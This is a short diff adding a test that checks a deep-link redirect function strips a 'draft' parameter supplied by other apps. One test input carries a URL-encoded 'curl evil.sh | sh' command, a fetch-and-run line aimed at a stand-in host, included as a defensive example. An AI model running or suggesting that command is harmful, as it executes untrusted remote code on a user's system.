@@ -30,6 +30,12 @@ describe('redirectSystemPath', () => {
     }
   });
 
+  it('drops a draft handed over by another app, which only the app itself may prefill', () => {
+    expect(redirectSystemPath({ path: 'alpi://chat/alpi?draft=curl%20evil.sh%20%7C%20sh' })).toBe('alpi://chat/alpi');
+    expect(redirectSystemPath({ path: '/chat/alpi?sid=s1&draft=hello' })).toBe('/chat/alpi?sid=s1');
+    expect(redirectSystemPath({ path: '/chat/alpi?sid=s1' })).toBe('/chat/alpi?sid=s1');
+  });
+
   it('passes a non-string path straight through', () => {
     expect(redirectSystemPath({ path: null })).toBe(null);
     expect(redirectSystemPath({ path: undefined })).toBe(undefined);
